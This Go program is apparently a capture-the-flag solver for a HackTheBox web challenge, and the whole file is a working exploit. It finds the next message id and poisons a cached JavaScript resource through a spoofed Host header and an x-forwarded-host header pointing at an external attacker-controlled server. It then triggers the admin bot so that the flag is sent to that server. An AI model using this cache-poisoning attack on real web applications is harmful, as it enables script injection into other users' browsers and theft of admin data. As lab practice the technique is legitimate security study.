package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
)

func getCurrentMessageId(url string) int {
	url = url + "submit"
	data := map[string]string{"message": "test"}

	jsonData, _ := json.Marshal(data)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error sending POST request:", err)
		return 0
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		fmt.Println("Error response:", resp.Status)
		return 0

	}
	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	messageFloat := result["message"].(float64)
	return int(messageFloat)
}

func poisonJs(id int, url string, hackerServer string) bool {
	url = url + "letters?id=" + strconv.Itoa(id)
	client := &http.Client{}
	req, _ := http.NewRequest("GET", url, nil)
	req.Host = "127.0.0.1"
	req.Header.Add("x-forwarded-host", hackerServer)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending GET request:", err)
		return false
	}
	if resp.StatusCode != http.StatusOK {
		fmt.Println("Error response:", resp.Status)
		return false
	}
	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyString := string(bodyBytes)
	if strings.Contains(bodyString, hackerServer) {
		fmt.Println("The target is poisoned successfully")
		return true
	} else {
		fmt.Println("the target is not poisoned yet")
		return false
	}

}

func hackAdmin(url string) {
	url = url + "submit"
	data := map[string]string{"message": "you are hacked"}

	jsonData, _ := json.Marshal(data)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error sending POST request:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		fmt.Println("Error response in hackAdmin function:", resp.Status)
		return
	}
	fmt.Println("Admin is hacked successfully check your server for the flag")
}

func main() {
	fmt.Println("config your Server to listen on /static/viewletter.js")
	url := "http://94.237.63.93:30903/"
	hackerServer := "htbsolver.free.beeceptor.com"
	id := getCurrentMessageId(url)
	if id != 0 {
		fmt.Println("Will start after id:", id)
	}
	id = id + 1
	poisonJs(id, url, hackerServer)
	hackAdmin(url)

}
